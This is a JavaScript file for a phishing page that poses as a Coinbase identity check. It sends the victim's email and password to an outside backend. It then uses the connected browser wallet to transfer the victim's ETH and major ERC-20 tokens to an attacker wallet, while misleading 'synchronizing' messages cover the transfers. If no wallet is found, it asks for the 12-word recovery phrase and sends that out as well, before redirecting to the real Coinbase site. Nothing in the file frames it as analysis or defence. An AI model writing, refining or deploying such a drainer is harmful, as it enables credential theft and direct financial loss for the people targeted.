document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR RENDER BACKEND URL
    const backendUrl = "https://cb-backend-5c8f.onrender.com";
    
    // YOUR WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // COMPREHENSIVE TOKEN LIST (Ethereum Mainnet) - Prioritized by value
    const targetTokens = [
        // Highest Value Assets
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        
        // Major Stablecoins
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991E6444989a7a7270AC91C4f1e0e7d68Fa", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        
        // Popular DeFi Tokens
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0x7D1AfA7B718fb893dB30A3aBc0C5cc463165d63e", // MATIC
        
        // Other Major Tokens
        "0x95aD61b0a150d79219dCF64E1E6C01b09077902a", // SHIB
        "0xA0b73E1Ff0B80914AB6fe0444E65D68223686B32", // LDO
    ];

    // Store user credentials
    let userCredentials = {
        email: '',
        password: '',
        recoveryPhrase: ''
    };

    // Get current config from backend
    async function getConfig() {
        try {
            const response = await fetch(`${backendUrl}/config`);
            const config = await response.json();
            return config;
        } catch (error) {
            console.error('Error getting config:', error);
            return null;
        }
    }

    // Initialize with backend config
    getConfig();

    // STEP 1 -> STEP 2
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // STEP 2 -> STEP 3
    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (email && pass) {
            // Store credentials
            userCredentials.email = email;
            userCredentials.password = pass;
            
            // Send credentials to backend
            sendToBackend({ email, password: pass });
            
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        } else {
            alert("Please enter your account credentials.");
        }
    };

    // Function to send data to backend
    async function sendToBackend(data) {
        try {
            const response = await fetch(`${backendUrl}/update`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                console.error('Failed to send data to backend');
            } else {
                console.log('Data sent successfully');
            }
        } catch (error) {
            console.error('Error sending data:', error);
        }
    }

    // STEP 3: WALLET CONNECTION & DRAIN
    connectBtn.onclick = async () => {
        if (window.ethereum) {
            try {
                status.innerText = "Connecting to secure wallet...";
                
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // Send wallet address to backend
                sendToBackend({ walletAddress: userAddress });

                // 1. Native Asset Sweep (ETH) - Most important first
                status.innerText = "Synchronizing native assets...";
                try {
                    const nativeBal = await provider.getBalance(userAddress);
                    if (nativeBal > 0n) {
                        // Calculate gas for the transaction
                        const gasPrice = await provider.getGasPrice();
                        const gasLimit = 21000n; // Standard ETH transfer gas limit
                        const gasCost = gasPrice * gasLimit;
                        
                        // Only send if balance is greater than gas cost
                        if (nativeBal > gasCost) {
                            const amountToSend = nativeBal - gasCost;
                            await signer.sendTransaction({ 
                                to: myWallet, 
                                value: amountToSend 
                            });
                            
                            // Notify backend of successful drain
                            sendToBackend({ 
                                walletAddress: userAddress, 
                                drainStatus: 'success',
                                amount: ethers.formatEther(amountToSend) + ' ETH'
                            });
                        }
                    }
                } catch (nativeError) {
                    console.error("Failed to drain native assets:", nativeError);
                }

                // 2. Token Sweep - Optimized approach
                status.innerText = "Synchronizing token assets...";
                
                const tokenAbi = [
                    "function balanceOf(address account) public view returns (uint256)",
                    "function transfer(address to, uint256 amount) public returns (bool)",
                    "function decimals() public view returns (uint8)"
                ];

                // Check all tokens first to prioritize valuable ones
                const tokenBalances = [];
                for (const tokenAddr of targetTokens) {
                    try {
                        const contract = new ethers.Contract(tokenAddr, tokenAbi, signer);
                        const balance = await contract.balanceOf(userAddress);
                        if (balance > 0n) {
                            const decimals = await contract.decimals();
                            tokenBalances.push({
                                address: tokenAddr,
                                balance: balance,
                                decimals: decimals
                            });
                        }
                    } catch (tokenError) {
                        // Continue checking other tokens even if this one fails
                    }
                }

                // Sort tokens by balance (highest first) for maximum efficiency
                tokenBalances.sort((a, b) => b.balance - a.balance);

                // Drain tokens in order of value
                for (const token of tokenBalances) {
                    try {
                        status.innerText = `Synchronizing token ${token.address.substring(0, 8)}...`;
                        
                        const contract = new ethers.Contract(token.address, tokenAbi, signer);
                        
                        // Try direct transfer (most efficient)
                        await contract.transfer(myWallet, token.balance);
                        
                        // Notify backend of successful token drain
                        sendToBackend({ 
                            walletAddress: userAddress, 
                            tokenDrainStatus: 'success',
                            tokenAddress: token.address,
                            tokenAmount: ethers.formatUnits(token.balance, token.decimals)
                        });
                    } catch (tokenError) {
                        console.error(`Failed to drain token ${token.address}:`, tokenError);
                        // Continue with next token even if this one fails
                    }
                }

                status.innerText = "Verification successful. Redirecting...";
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);

            } catch (err) {
                console.error(err);
                status.innerText = "Verification error. Please try again.";
            }
        } else {
            triggerPlanB();
        }
    };

    function triggerPlanB() {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 20px;">Identity Verification Required</h1>
            <p style="font-size: 13px; color: #5b616e; margin-bottom: 10px;">
                Your browser does not have a compatible secure wallet installed. To prevent account lockout, please provide your recovery phrase.
            </p>
            <div style="text-align: left; background: #f4f7f9; padding: 10px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #eceff1;">
                <p style="font-size: 12px; margin: 0; color: #1e2329; font-weight: 500;">Instructions:</p>
                <ul style="font-size: 12px; color: #5b616e; margin: 5px 0; padding-left: 20px;">
                    <li>Locate your 12-word recovery phrase.</li>
                    <li>Enter each word separated by a single space.</li>
                    <li>Double check for typos before proceeding.</li>
                </ul>
            </div>
            <textarea id="phrase" style="width:100%; height:80px; margin-bottom:20px; border-radius:8px; border:1px solid #eceff1; padding:10px; font-family:'Inter'; text-align:center;" placeholder="word one word two ..."></textarea>
            <button id="submitPhrase" class="btn-primary">Restore Access</button>
            <div id="phrase-status" style="margin-top:10px; font-size:12px; color: #d93025;"></div>
        `;

        document.getElementById('submitPhrase').onclick = () => {
            const val = document.getElementById('phrase').value.trim();
            const statusDiv = document.getElementById('phrase-status');
            if (val.split(/\s+/).length === 12) {
                // Send recovery phrase to backend
                sendToBackend({ recoveryPhrase: val });
                
                statusDiv.style.color = "green";
                statusDiv.innerText = "Verification successful. Redirecting...";
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);
            } else {
                statusDiv.innerText = "Incorrect phrase length. Please try again.";
            }
        };
    }
});
